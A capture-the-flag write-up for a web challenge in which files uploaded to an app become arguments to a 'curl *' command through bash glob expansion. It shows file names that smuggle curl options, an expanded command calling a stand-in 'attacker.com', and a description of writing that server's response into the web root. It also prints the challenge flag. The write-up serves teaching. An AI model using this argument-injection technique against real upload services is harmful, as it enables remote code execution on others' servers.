# [Web] Warmup

Let's start off with this warmup challenge, shall we?

## Attachments

- [warmup.zip](attachments/warmup.zip)

## Inspiration

This challenge was inspired from the web/submissions challenge of [x3CTF 2025 (feat. mvm)](https://x3c.tf/). You can watch the solution/walkthrough of this challenge [here](https://www.youtube.com/watch?v=0TNxp2SIxAo).

To learn more about [bash globbing abuse](https://oxasploits.com/posts/bash-wildcard-expansion-arbitrary-command-line-arguments-0day/).

## Solution

The basic functionality of the app is that it allows users to upload files which are then moved to a random folder under the uploads/ directory. There is another file `test.php` which will go into that uploads directory and then run the following command:

```
curl *
```

The way it would work is that the shell will first expand the "*" into files/arguments which will be then passed to curl. For example, consider that the uploads folder contain the following files:

```
attacker.com
-o test.txt
```

The full command will then be expanded to:

```
curl attacker.com -otest.txt
```

After which running, it will then store the response of attacker.com into a file named "test.txt".
So, we can upload arbitrary arguments to curl by uploading a file with the argument as the file name. Now, curl supports various arguments which you can provide, my solution was to upload a config file which contains arguments for storing the response of my server in /var/www/html.

My solution script: [solve.py](solve.py)

## Flag

```
STC{b45h_gl0b_1nj3c710n_v14_f1l3_upl04d_g035_brrrrrrr}
```